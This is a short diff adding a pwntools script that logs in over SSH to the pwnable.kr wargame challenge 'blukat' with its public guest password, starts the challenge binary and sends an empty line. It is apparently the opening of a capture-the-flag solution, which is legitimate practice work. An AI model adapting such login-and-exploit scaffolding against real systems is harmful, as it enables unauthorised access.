@@ -1,0 +1,6 @@
+from pwn import *
+import random
+
+shell = ssh('blukat', 'pwnable.kr', 2222, password='guest')
+sh = shell.process('./blukat')
+sh.sendline('')
